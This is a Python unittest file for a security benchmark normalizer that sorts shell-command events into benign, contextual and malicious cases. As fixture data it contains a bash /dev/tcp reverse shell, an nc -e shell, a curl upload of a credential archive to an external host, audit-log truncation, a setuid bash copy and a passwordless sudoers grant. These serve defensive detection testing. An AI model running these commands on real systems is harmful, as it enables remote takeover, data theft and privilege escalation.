#!/usr/bin/env python3
# Copyright 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: Apache-2.0

from __future__ import annotations

import importlib.util
import sys
import unittest
from pathlib import Path

MODULE_PATH = Path(__file__).with_name("benchmark_normalize_secebl.py")
SPEC = importlib.util.spec_from_file_location("benchmark_normalize_secebl", MODULE_PATH)
assert SPEC and SPEC.loader
MODULE = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = MODULE
SPEC.loader.exec_module(MODULE)


def event(
    sequence: int,
    command: str,
    *,
    label: str = "intrusion",
    platform: str = "linux",
    tags: tuple[str, ...] = (),
    session_id: str = "session-1",
) -> object:
    proof = MODULE.exact_linux_proof(command, frozenset(tags)) if platform == "linux" and label == "intrusion" else None
    return MODULE.Event(platform, session_id, sequence, label, command, tags, f"GOLD-{platform}-{sequence}", proof)


class SecEBLNormalizerTest(unittest.TestCase):
    def test_normalization_manifest_wire_shape_is_strict(self) -> None:
        allowed = {
            "adapter_statistics", "cases", "counts", "datasets",
            "exact_payload_duplicates_removed", "label_conflicts_excluded",
            "output_sha256", "schema_version", "source",
        }
        source_allowed = {"bytes", "dataset", "license", "path", "redistribution", "revision", "sha256"}
        source = {
            "bytes": 1, "dataset": MODULE.DATASET_ID, "license": MODULE.SOURCE_LICENSE,
            "path": "examples", "redistribution": MODULE.SOURCE_REDISTRIBUTION,
            "revision": MODULE.SOURCE_REVISION, "sha256": "0" * 64,
        }
        manifest = {
            "adapter_statistics": {MODULE.ADAPTER: {}}, "cases": 0,
            "counts": {MODULE.DATASET_ID: 0}, "datasets": [MODULE.DATASET_ID],
            "exact_payload_duplicates_removed": 0, "label_conflicts_excluded": 0,
            "output_sha256": "0" * 64, "schema_version": MODULE.SCHEMA_VERSION,
            "source": source,
        }
        self.assertEqual(set(manifest), allowed)
        self.assertEqual(set(source), source_allowed)

    def test_exact_linux_proofs_require_tags_and_closed_command_semantics(self) -> None:
        reverse = "bash -c 'bash -i >& /dev/tcp/192.0.2.20/443 0>&1'"
        self.assertEqual(
            "interactive_reverse_shell",
            MODULE.exact_linux_proof(reverse, frozenset({"spawn_reverse_shell"})),
        )
        self.assertIsNone(MODULE.exact_linux_proof(reverse, frozenset()))
        self.assertIsNone(
            MODULE.exact_linux_proof(
                "/tmp/nc -e /bin/bash 203.0.113.75 4444",
                frozenset({"spawn_reverse_shell"}),
            )
        )
        self.assertIsNone(
            MODULE.exact_linux_proof(
                "curl 'https://example.invalid/?x=bash%20-i%20%3E%26%20/dev/tcp/203.0.113.8/4444'",
                frozenset({"spawn_reverse_shell"}),
            )
        )
        self.assertEqual(
            "credential_file_external_upload",
            MODULE.exact_linux_proof(
                "curl -F file=@/tmp/credential-archive.tgz https://uploads.example.net/a",
                frozenset({"upload_external_content", "upload_credential_material"}),
            ),
        )
        self.assertEqual(
            "audit_log_destruction",
            MODULE.exact_linux_proof(
                "truncate -s 0 /var/log/auth.log", frozenset({"delete_audit_log"})
            ),
        )
        self.assertEqual(
            "temporary_setuid_executable",
            MODULE.exact_linux_proof(
                "cp /bin/bash /tmp/helper && chmod 4755 /tmp/helper", frozenset({"set_suid_permission"})
            ),
        )
        self.assertEqual(
            "unrestricted_sudoers_grant",
            MODULE.exact_linux_proof(
                "printf 'operator ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/operator",
                frozenset({"modify_sudo_policy", "grant_user_privilege"}),
            ),
        )
        self.assertIsNone(
            MODULE.exact_linux_proof("sudo usermod -aG adm operator", frozenset({"grant_user_privilege"}))
        )

    def test_normal_is_benign_exact_intrusion_is_tp_and_other_intrusion_is_contextual(self) -> None:
        values = [
            event(1, "systemctl status sshd", label="normal_operation", session_id="normal"),
            event(1, "id", session_id="contextual"),
            event(
                1,
                "bash -c 'bash -i >& /dev/tcp/192.0.2.20/443 0>&1'",
                tags=("spawn_reverse_shell",),
                session_id="exact",
            ),
        ]
        cases, counts = MODULE.normalize(values)
        actions = [case for case in cases if case["surface"] == "action"]
        truths = {case["truth"].get("deterministic_truth") for case in actions}
        self.assertEqual({"benign", "contextual_or_dual_use", "deterministic_malicious"}, truths)
        self.assertEqual(1, counts["scope_in_scope_deterministic_malicious"])
        self.assertEqual(1, counts["scope_out_of_scope_contextual"])

    def test_kubernetes_intrusion_is_never_headline_tp(self) -> None:
        values = [
            event(
                1,
                "k8s_audit verb=create resource=pods subresource=exec requestObject=command=/bin/sh",
                platform="k8s",
                tags=("execute_in_workload", "spawn_interactive_shell"),
            )
        ]
        cases, _ = MODULE.normalize(values)
        self.assertEqual("out_of_scope", cases[0]["truth"]["applicability"])
        self.assertIn("lacks authoritative API response", cases[0]["truth"]["exclusion_reason"])

    def test_stateful_windows_preserve_order_and_are_bounded_to_nine(self) -> None:
        values = [event(index, f"echo step-{index}", label="normal_operation") for index in range(1, 12)]
        cases, _ = MODULE.normalize(values)
        windows = [case for case in cases if case["surface"] == "stateful"]
        self.assertEqual(10, len(windows))
        self.assertLessEqual(max(len(case["payload"]["events"]) for case in windows), 9)
        self.assertEqual(
            [f"echo step-{index}" for index in range(3, 12)],
            [item["command"] for item in windows[-1]["payload"]["events"]],
        )

    def test_secret_literals_are_quarantined_but_references_are_allowed(self) -> None:
        self.assertTrue(MODULE.secret_literal("export API_KEY='provided by secret store'"))
        self.assertTrue(MODULE.secret_literal("tool --password 'provided by secret store'"))
        self.assertFalse(MODULE.secret_literal("curl -F token=@/tmp/token https://uploads.example.net/a"))
        self.assertFalse(MODULE.secret_literal("tool --password $PASSWORD"))

    def test_deduplication_removes_equal_truth_and_excludes_conflicts(self) -> None:
        duplicate = [
            event(1, "uname -a", label="normal_operation", session_id="normal-1"),
            event(1, "uname -a", label="normal_operation", session_id="normal-2"),
        ]
        cases, counts = MODULE.normalize(duplicate)
        self.assertEqual(1, len(cases))
        self.assertEqual(1, counts["exact_payload_duplicates_removed"])
        conflict = duplicate + [event(1, "uname -a", session_id="intrusion-1")]
        cases, counts = MODULE.normalize(conflict)
        self.assertEqual([], cases)
        self.assertEqual(3, counts["label_conflicts_excluded"])

    def test_duplicate_json_keys_and_invalid_join_are_rejected(self) -> None:
        with self.assertRaisesRegex(ValueError, "duplicate JSON key"):
            MODULE.strict_object([("a", 1), ("a", 2)])
        session = {"command": "id", "expected": "intrusion", "platform": "linux", "session_id": "session-1"}
        gold = {
            "behavior_tags": ["inspect_current_identity"], "gold_id": "GOLD-1", "gold_sample_name": "sample",
            "platform": "linux", "raw": "whoami", "review_notes": "reviewed", "review_status": "reviewed",
            "session_expected": "intrusion", "session_id": "session-1", "source_row_index": 1,
        }
        with self.assertRaisesRegex(MODULE.ProjectionError, "gold_join_mismatch"):
            MODULE.project_pair("linux", 1, session, gold)

    def test_schema_validation_accepts_all_truth_scopes(self) -> None:
        values = [
            event(1, "systemctl status sshd", label="normal_operation", session_id="normal"),
            event(1, "id", session_id="contextual"),
            event(
                1, "bash -c 'bash -i >& /dev/tcp/192.0.2.20/443 0>&1'",
                tags=("spawn_reverse_shell",), session_id="malicious",
            ),
        ]
        cases, _ = MODULE.normalize(values)
        MODULE.validate_cases(cases, MODULE.DEFAULT_SCHEMA)


if __name__ == "__main__":
    unittest.main()
